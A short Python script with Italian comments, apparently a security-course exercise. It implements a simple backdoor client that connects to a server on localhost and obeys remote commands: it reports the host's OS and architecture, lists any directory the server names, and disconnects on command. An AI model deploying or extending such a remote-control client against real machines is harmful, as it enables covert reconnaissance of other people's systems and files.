import os
import platform
import socket

# Definizione dell'indirizzo IP e della porta del server a cui ci si collegherà
SRV_ADDR = "127.0.0.1"
SRV_PORT = 12345

# Creazione di un socket IPv4 (AF_INET) e TCP (SOCK_STREAM)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connessione al server
s.connect((SRV_ADDR, SRV_PORT))
print(f"Connected to {SRV_ADDR}:{SRV_PORT}")

while True:
    try:
        # Ricezione di dati dal server, con un buffer di 1024 byte
        data = s.recv(1024).decode("utf-8").strip()
        if not data:
            break

        # Controllo del comando ricevuto dal server
        if data == "1":
            # Se il comando è "1", raccoglie informazioni sul sistema operativo e l'architettura
            tosend = platform.platform() + " " + platform.machine()
            # Invia le informazioni raccolte al server
            s.sendall(tosend.encode("utf-8"))
        elif data.startswith("2 "):
            # Se il comando è "2", tenta di elencare i file in una directory specificata dal server
            try:
                dir_to_list = data[2:]  # Ottiene il percorso della directory
                filelist = os.listdir(dir_to_list)
                tosend = "\n".join(filelist)
            except Exception as e:
                tosend = str(e)
            # Invia l'elenco dei file o il messaggio di errore al server
            s.sendall(tosend.encode("utf-8"))
        elif data == "0":
            # Se il comando è "0", chiude la connessione
            s.close()
            break
    except Exception as e:
        # Gestione degli errori
        print(f"Error: {str(e)}")
        s.close()
        break
